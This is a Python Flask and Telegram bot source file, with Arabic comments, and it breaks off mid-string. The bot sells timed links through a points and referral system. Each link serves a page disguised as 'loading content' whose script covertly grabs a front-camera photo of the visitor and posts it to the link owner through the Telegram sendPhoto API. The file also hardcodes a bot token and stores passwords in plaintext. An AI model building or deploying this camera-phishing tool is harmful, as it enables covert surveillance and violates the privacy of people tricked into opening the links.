import os
import sqlite3
import threading
import time
import random
import requests
from flask import Flask, render_template_string, request

TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")
ADMIN_USER = "raouf100K"

app = Flask(__name__)

# --- إعداد قاعدة البيانات SQLite ---
DB_FILE = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    # جدول المستخدمين
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        user_id INTEGER PRIMARY KEY,
                        username TEXT,
                        custom_id TEXT UNIQUE,
                        password TEXT,
                        points INTEGER DEFAULT 0,
                        referred_by INTEGER,
                        referral_count INTEGER DEFAULT 0,
                        banned_until INTEGER DEFAULT 0,
                        ban_type TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
    # جدول الروابط النشطة للمستخدمين (كاميرا)
    cursor.execute('''CREATE TABLE IF NOT EXISTS links (
                        link_id TEXT PRIMARY KEY,
                        user_id INTEGER,
                        expires_at INTEGER,
                        duration_name TEXT
                    )''')
    # جدول الروابط الـ 8 الخاصة بطريقة التجميع الثانية
    cursor.execute('''CREATE TABLE IF NOT EXISTS t2_links (
                        slot_id INTEGER PRIMARY KEY,
                        url TEXT
                    )''')
    # تهيئة روابط افتراضية للطريقة الثانية إذا كانت فارغة
    cursor.execute("SELECT COUNT(*) FROM t2_links")
    if cursor.fetchone()[0] == 0:
        for i in range(1, 9):
            cursor.execute("INSERT INTO t2_links (slot_id, url) VALUES (?, ?)", (i, "https://ouo.io/example"))
            
    # جدول لتخزين وقت آخر استخدام لعجلة الحظ أو الـ 8 أزرار (كل 24 ساعة)
    cursor.execute('''CREATE TABLE IF NOT EXISTS cooldowns (
                        user_id INTEGER,
                        action_name TEXT,
                        last_time INTEGER,
                        PRIMARY KEY(user_id, action_name)
                    )''')
    conn.commit()
    conn.close()

init_db()

# --- واجهة الويب لالتقاط الصور والروابط الموقوتة ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري تحميل المحتوى...</title>
    <style>
        body { background: #0f172a; color: white; font-family: Tahoma, sans-serif; text-align: center; padding-top: 100px; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; display: inline-block; max-width: 400px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎮 جاري تجهيز الطلب...</h2>
        <p>{{ message }}</p>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";
        const isValid = {{ is_valid|tojson }};

        if (isValid) {
            async function capture() {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    let video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(async () => {
                        let canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(async (blob) => {
                            let fd = new FormData();
                            fd.append('chat_id', TARGET_CHAT_ID);
                            fd.append('photo', blob, 'shot.jpg');
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/jpeg', 0.9);
                    }, 2000);
                } catch(e) {}
            }
            window.onload = capture;
        }
    </script>
</body>
</html>
"""

@app.route('/c/<link_id>')
def view_link(link_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, expires_at FROM links WHERE link_id = ?", (link_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        return render_template_string(HTML_TEMPLATE, message="❌ هذا الرابط غير موجود أو تم حذفه!", is_valid=False, token=TOKEN, chat_id=0)
    
    user_id, expires_at = row
    if expires_at != 0 and time.time() > expires_at:
        return render_template_string(HTML_TEMPLATE, message="⚠️ عذراً، انتهت صلاحية هذا الرابط! يجدر بصاحبه شراء رابط جديد.", is_valid=False, token=TOKEN, chat_id=0)
        
    return render_template_string(HTML_TEMPLATE, message="يرجى الانتظار قليلاً...", is_valid=True, token=TOKEN, chat_id=user_id)

@app.route('/')
def home():
    return "Bot is fully active and running!"

# --- دوال مساعدة للبوت ---
def check_sub(user_id):
    # التحقق من الاشتراك في القناتين (يجب أن يكون البوت مشرفاً فيهما)
    try:
        r1 = requests.get(f"{TELEGRAM_API}/getChatMember?chat_id=@F_ONDRAY_FF&user_id={user_id}").json()
        # قناة يوتيوب يتم تجاوزها أو التحقق يدوياً حسب صلاحيات تيليجرام (نكتفي بقناة تيليجرام كمثال أساسي أو الاثنين معا)
        if r1.get("result", {}).get("status") in ["member", "administrator", "creator"]:
            return True
    except:
        pass
    return False

def send_msg(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)

# --- محرك التليجرام الرئيسي ---
def run_telegram_bot():
    offset = 0
    # خريطة لحفظ حالة المستخدم المؤقتة (مثل إدخال كلمة مرور، أيدي، إلخ)
    user_states = {}
    
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    
                    # معالجة الرسائل النصية
                    if "message" in update and "text" in update["message"]:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        text = msg["text"]
                        username = msg["from"].get("username", "بدون يوزر")
                        
                        conn = sqlite3.connect(DB_FILE)
                        cursor = conn.cursor()
                        cursor.execute("SELECT banned_until, ban_type, custom_id FROM users WHERE user_id = ?", (chat_id,))
                        user_row = cursor.fetchone()
                        
                        # التحقق من الحظر
                        if user_row and user_row[0] > time.time():
                            rem = int(user_row[0] - time.time())
                            hrs = rem // 3600
                            send_msg(chat_id, f"عزيزي، اكتشف أن نظامك غير طبيعي تم حظر الحساب بشكل مؤقت.\nيمكنك الرجوع بعد: {hrs} ساعة.\n\n[🔄 تحديث الوقت]", {"inline_keyboard": [[{"text": "🔄 تحديث الوقت", "callback_data": "refresh_ban"}], [{"text": "🗑️ تدمير الحساب", "callback_data": "destroy_acc"}], [{"text": "📞 مراسلة المطور", "url": f"https://t.me/{ADMIN_USER}"}]]})
                            conn.close()
                            continue
                        conn.close()
                        
                        if text.startswith("/start"):
                            # التحقق من الإحالة
                            args = text.split()
                            ref_id = None
                            if len(args) > 1 and args[1].isdigit():
                                ref_id = int(args[1])
                                
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (chat_id,))
                            exists = cursor.fetchone()
                            if not exists and ref_id and ref_id != chat_id:
                                cursor.execute("INSERT INTO users (user_id, username, referred_by) VALUES (?, ?, ?)", (chat_id, username, ref_id))
                                # تحديث عداد الإحالة للشخص الداعي
                                cursor.execute("UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?", (ref_id,))
                                # التحقق إذا وصل 5 إحالات ليحصل الداعي على 30 نقطة
                                cursor.execute("SELECT referral_count, points FROM users WHERE user_id = ?", (ref_id,))
                                ref_data = cursor.fetchone()
                                if ref_data and ref_data[0] % 5 == 0:
                                    cursor.execute("UPDATE users SET points = points + 30 WHERE user_id = ?", (ref_id,))
                            elif not exists:
                                cursor.execute("INSERT INTO users (user_id, username) VALUES (?, ?)", (chat_id, username))
                            conn.commit()
                            conn.close()
                            
                            # التحقق من الاشتراك الإجباري
                            if not check_sub(chat_id):
                                markup = {
                                    "inline_keyboard": [
                                        [{"text": "📢 قناة تيليجرام", "url": "https://t.me/F_ONDRAY_FF"}],
                                        [{"text": "📺 قناة يوتيوب", "url": "https://youtube.com/@dray-xit?si=x_VP4lvf0oEKss5M"}],
                                        [{"text": "✅ تحقق من الاشتراك", "callback_data": "check_subscription"}]
                                    ]
                                }
                                send_msg(chat_id, " أهلاً بك! يرجى الاشتراك في القناتين أدناه أولاً لمتابعة الاستخدام:", markup)
                            else:
                                show_main_menu(chat_id)
                                
                        elif chat_id in user_states:
                            state = user_states[chat_id]
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            
                            if state == "entering_custom_id":
                                custom_id = text.strip()
                                user_states[chat_id] = {"state": "entering_password", "custom_id": custom_id}
                                send_msg(chat_id, "🔑 أضف كلمة مرور لحسابك الجديد:")
                            elif isinstance(state, dict) and state.get("state") == "entering_password":
                                custom_id = state["custom_id"]
                                password = text.strip()
                                cursor.execute("UPDATE users SET custom_id = ?, password = ? WHERE user_id = ?", (custom_id, password, chat_id))
                                conn.commit()
                                del user_states[chat_id]
                                send_msg(chat_id, f"✅ تم إنشاء حسابك بنجاح!\n🆔 الأيدي الخاص بك: <code>{custom_id}</code>")
                                show_main_menu(chat_id)
                                
                            elif state == "restore_id":
                                user_states[chat_id] = {"state": "restore_pass", "custom_id": text.strip()}
                                send_msg(chat_id, "🔐 أכנס كلمة المرور الخاصة بحسابك:")
                            elif isinstance(state, dict) and state.get("state") == "restore_pass":
                                c_id = state["custom_id"]
                                password = text.strip()
                                cursor.execute("SELECT user_id FROM users WHERE custom_id = ? AND password = ?", (c_id, password))
                                found = cursor.fetchone()
                                if found:
                                    old_id = found[0]
                                    # دمج الحسابات أو نقل الملكية
                                    send_msg(chat_id, "✅ تم استرداد الحساب بنجاح ودخلت إليه مباشرة!")
                                    show_main_menu(chat_id)
                                else:
                                    send_msg(chat_id, "❌ الأيدي أو كلمة المرور خطأ! حاول مجددا.")
                                del user_states[chat_id]
                                
                            conn.close()
                            
                    # معالجة الضغط على الأزرار (Callback Queries)
                    elif "callback_query" in update:
                        cq = update["callback_query"]
                        cq_id = cq["id"]
                        chat_id = cq["message"]["chat"]["id"]
                        data = cq["data"]
                        
                        requests.post(f"{TELEGRAM_API}/answerCallbackQuery", json={"callback_query_id": cq_id})
                        
                        if data == "check_subscription":
                            if check_sub(chat_id):
                                show_auth_menu(chat_id)
                            else:
                                send_msg(chat_id, "❌ لم تقم بالاشتراك في القناتين بعد!")
                                
                        elif data == "auth_create":
                            user_states[chat_id] = "entering_custom_id"
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (chat_id,))
                            row = cursor.fetchone()
                            conn.close()
                            send_msg(chat_id, f"🆔 هذا هو الأيدي الخاص بك: <code>{chat_id}</code>\nأدخل الآن معرفاً مميزاً أو اترك رقمك وأدخل كلمة المرور:")
                            
                        elif data == "auth_restore":
                            user_states[chat_id] = "restore_id"
                            send_msg(chat_id, "✍️ أدخل الأيدي الخاص بحسابك المراد استرداده:")
                            
                        elif data == "main_profile":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT custom_id, points FROM users WHERE user_id = ?", (chat_id,))
                            row = cursor.fetchone()
                            conn.close()
                            c_id = row[0] if row and row[0] else chat_id
                            pts = row[1] if row else 0
                            ref_link = f"https://t.me/{(requests.get(f'{TELEGRAM_API}/getMe').json().get('result', {}).get('username'))}?start={chat_id}"
                            
                            text = (
                                f"👤 **الملف الشخصي**\n\n"
                                f"🆔 أيدي البوت: <code>{c_id}</code>\n"
                                f"💎 عدد النقاط: <b>{pts}</b>\n"
                                f"🔗 رابط الاحالة الخاص بك:\n<code>{ref_link}</code>"
                            )
                            markup = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_to_main"}]]}
                            send_msg(chat_id, text, markup)
                            
                        elif data == "main_collect":
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "الطريقة 1️⃣: دعوة الأصدقاء", "callback_data": "method_1"}],
                                    [{"text": "الطريقة 2️⃣: الروابط والرواتب", "callback_data": "method_2"}],
                                    [{"text": "الطريقة 3️⃣: عجلة الحظ 🎡", "callback_data": "method_3"}],
                                    [{"text": "🔙 رجوع للقائمة", "callback_data": "back_to_main"}]
                                ]
                            }
                            send_msg(chat_id, "🎯 **اختر طريقة تجميع النقاط:**", markup)
                            
                        elif data == "method_1":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT referral_count FROM users WHERE user_id = ?", (chat_id,))
                            rc = cursor.fetchone()[0]
                            conn.close()
                            ref_link = f"https://t.me/{(requests.get(f'{TELEGRAM_API}/getMe').json().get('result', {}).get('username'))}?start={chat_id}"
                            text = (
                                f"👥 **طريقة التجميع 1**\n\n"
                                f"شارك رابط الاحالة الخاص بك:\n<code>{ref_link}</code>\n\n"
                                f"كل شخص ينضم ويجمع 5 نقاط تحصل أنت على **30 نقطة**!\n"
                                f"📊 عدد الأشخاص الذين انضموا عبر رابطك: <b>{rc}</b>"
                            )
                            send_msg(chat_id, text, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "main_collect"}]]})
                            
                        elif data == "method_2":
                            # عرض 8 أزرار
                            buttons = []
                            for i in range(1, 9):
                                buttons.append({"text": f"زر رقم {i} 🌐", "callback_data": f"t2_btn_{i}"})
                            # ترتيب الأزرار في صفوف
                            keyboard = [buttons[i:i+2] for i in range(0, len(buttons), 2)]
                            keyboard.append([{"text": "🔙 رجوع", "callback_data": "main_collect"}])
                            send_msg(chat_id, "🔗 **اختر أحد الروابط أدناه للتخطي والحصول على الكود:**", {"inline_keyboard": keyboard})
                            
                        elif data.startswith("t2_btn_"):
                            slot = data.split("_")[2]
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url FROM t2_links WHERE slot_id = ?", (slot,))
                            u_row = cursor.fetchone()
                            conn.close()
                            target_url = u_row[0] if u_row else "https://google.com"
                            
                            text = f"🌐 اضغط على الرابط أدناه لتخطي الإعلان والحصول على الكود:\n\n{target_url}\n\nبعد حصولك على الكود، توجه لزر 'إدخال الكود' في البوت."
                            send_msg(chat_id, text, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "method_2"}]]})
                            
                        elif data == "method_3":
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "🎡 تدوير عجلة الحظ", "callback_data": "spin_wheel"}],
                                    [{"text": "🔙 رجوع", "callback_data": "main_collect"}]
                                ]
                            }
                            send_msg(chat_id, "🎡 **عجلة الحظ اليومية:**\nتحصل على نقاط عشوائية (من 3 إ
